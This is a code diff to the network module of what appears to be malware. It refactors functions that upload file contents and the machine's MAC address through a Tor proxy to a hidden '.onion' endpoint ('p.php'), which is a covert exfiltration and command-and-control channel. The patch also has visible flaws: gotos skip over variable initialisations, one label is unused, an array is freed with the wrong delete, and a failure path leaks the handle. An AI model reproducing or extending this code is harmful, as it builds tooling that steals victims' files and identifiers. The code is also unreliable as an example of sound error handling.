@@ -7,6 +7,8 @@
 #include <curl\curl.h>
 #include "External\http.h"
 
+static const char *post_url = "http://" V_NET_DOMAIN_ONION V_NET_BASE "p.php";
+
 struct http_response
 {
 	int code;
@@ -97,13 +99,17 @@ bool Network::Send(const char *req_method, const char *req_url, const char *req_
 					size_t req_num_parts, size_t *req_data_len, const char **req_data,
 					size_t *resp_len, char **resp_data)
 {
+    CURL *curl;
+	CURLcode status;
+
+    /* Add MAC parameter to req_len */
 	std::string macAddrPost = "&mac=" + macAddrDataStr;
 	size_t req_len = macAddrPost.size();
+
 	for (size_t i = 0; i < req_num_parts; i++)
 		req_len += req_data_len[i];
 
-	CURL *curl;
-	CURLcode status;
+	char *req_post_data = new char[req_len];
 
 	curl = curl_easy_init();
 
@@ -111,10 +117,11 @@ bool Network::Send(const char *req_method, const char *req_url, const char *req_
 		return false;
 	}
 
-	const char *url = "http://" V_NET_DOMAIN_ONION V_NET_BASE "p.php";
-	status = curl_easy_setopt(curl, CURLOPT_URL, url);
+	status = curl_easy_setopt(curl, CURLOPT_URL, post_url);
+    if(status != CURLE_OK) {
+        goto out_free_curl;
+    }
 
-	char *req_post_data = new char[req_len];
 	size_t s = 0;
 	for(size_t i = 0; i < req_num_parts; i++) {
 		memcpy(&req_post_data[s], req_data[i], req_data_len[i]);
@@ -126,16 +133,25 @@ bool Network::Send(const char *req_method, const char *req_url, const char *req_
 	std::string response;
 
 	status = curl_easy_setopt(curl, CURLOPT_POSTFIELDS, req_post_data);
+    if(status != CURLE_OK) {
+        goto out_free_curl;
+    }
 
 	status = curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CURLWriteToString);
+    if(status != CURLE_OK) {
+        goto out_free_curl;
+    }
+
 	status = curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+    if(status != CURLE_OK) {
+        goto out_free_curl;
+    }
 
 	status = curl_easy_perform(curl);
 	if(status != CURLE_OK) {
 		VError(L"Failed to post: %u\n", status);
-		delete req_post_data;
-		return false;
-	}
+        goto out_free_curl;
+    }
 
 	delete req_post_data;
 	curl_easy_cleanup(curl);
@@ -162,58 +178,93 @@ bool Network::Send(const char *req_method, const char *req_url, const char *req_
 	*resp_len = r.body.size();
 
 	return true;
+
+out_free_curl:
+    curl_easy_cleanup(curl);
+out_free_req_post_data:
+    delete req_post_data;
+    return false;
 }
 
 bool Network::SendFile(const char* req_url, size_t file_size, const char *file)
 {
-	CURL *curl = curl_easy_init();
+	CURL *curl;
 	CURLcode status;
-	if(!InitCURLTorProxy(curl)) {
-		return false;
-	}
+    bool ret = false;
 
 	curl_httppost *formpost = NULL;
 	curl_httppost *lastptr = NULL;
 	curl_slist *headerlist = NULL;
 
-	curl_formadd(	&formpost,
-					&lastptr,
-					CURLFORM_COPYNAME, "s",
-					CURLFORM_BUFFER, "1",
-					CURLFORM_BUFFERPTR, file,
-					CURLFORM_BUFFERLENGTH, file_size,
-					CURLFORM_END);
+    curl = curl_easy_init();
+    if(!curl) {
+        goto out_free_curl;
+    }
 
-	curl_formadd(	&formpost,
-					&lastptr,
-					CURLFORM_COPYNAME, "mac",
-					CURLFORM_COPYCONTENTS, macAddrDataStr.c_str(),
-					CURLFORM_END);
+	if(!InitCURLTorProxy(curl)) {
+		return false;
+	}
 
-	const char *url = "http://" V_NET_DOMAIN_ONION V_NET_BASE "p.php";
-	status = curl_easy_setopt(curl, CURLOPT_URL, url);
+	if(curl_formadd(	&formpost,
+                        &lastptr,
+                        CURLFORM_COPYNAME, "s",
+                        CURLFORM_BUFFER, "1",
+                        CURLFORM_BUFFERPTR, file,
+                        CURLFORM_BUFFERLENGTH, file_size,
+                        CURLFORM_END) != 0) {
+        goto out_free_curl;
+    }
+
+	if(curl_formadd(	&formpost,
+                        &lastptr,
+                        CURLFORM_COPYNAME, "mac",
+                        CURLFORM_COPYCONTENTS, macAddrDataStr.c_str(),
+                        CURLFORM_END) != 0) {
+        goto out_free_curl;
+    }
+
+	status = curl_easy_setopt(curl, CURLOPT_URL, post_url);
+    if(status != CURLE_OK) {
+        goto out_free_curl;
+    }
 
 	headerlist = curl_slist_append(headerlist, "Expect:");
 	status = curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);
-	status = curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
+    if(status != CURLE_OK) {
+        goto out_free_curl;
+    }
 
+
+	status = curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
+    if(status != CURLE_OK) {
+        goto out_free_curl;
+    }
+
+
+    /* Do not need this? */
+    /*
 	std::string response;
 
 	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CURLWriteToString);
 	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+    */
 
 	status = curl_easy_perform(curl);
 	if(status != CURLE_OK) {
 		VError(L"Failed curl post");
-		return false;
+	    goto out_free_curl;	
 	}
 
+    ret = true;
+
+out_free_curl:
 	curl_easy_cleanup(curl);
 	curl_formfree(formpost);
 	curl_slist_free_all(headerlist);
 
-	return true;
+	return ret;
 }
+
 bool Network::SendAndGetTextA(const char* req_url, const char *text, size_t *resp_len, char **resp_data)
 {
 	size_t req_data_len[1] = {
@@ -228,6 +279,7 @@ bool Network::SendAndGetTextA(const char* req_url, const char *text, size_t *res
 		1, req_data_len, req_data,
 		resp_len, resp_data);
 }
+
 bool Network::SendAndGetTextW(const char* req_url, const wchar_t *text, size_t *resp_len, wchar_t **resp_data)
 {
 	char *text_mb = Util::w2mb(text, wcslen(text));
@@ -258,10 +310,12 @@ bool Network::SendAndGetTextW(const char* req_url, const wchar_t *text, size_t *
 	}
 	return ret;
 }
+
 bool Network::SendTextA(const char* req_url, const char *text)
 {
 	return this->SendAndGetTextA(req_url, text, nullptr, nullptr);
 }
+
 bool Network::SendTextW(const char* req_url, const wchar_t *text)
 {
 	char *text_mb = Util::w2mb(text, wcslen(text));
@@ -269,6 +323,7 @@ bool Network::SendTextW(const char* req_url, const wchar_t *text)
 	free(text_mb);
 	return ret;
 }
+
 bool Network::GetFile(const char* req_url, size_t *resp_len, char **resp_data)
 {
 	return this->Send(
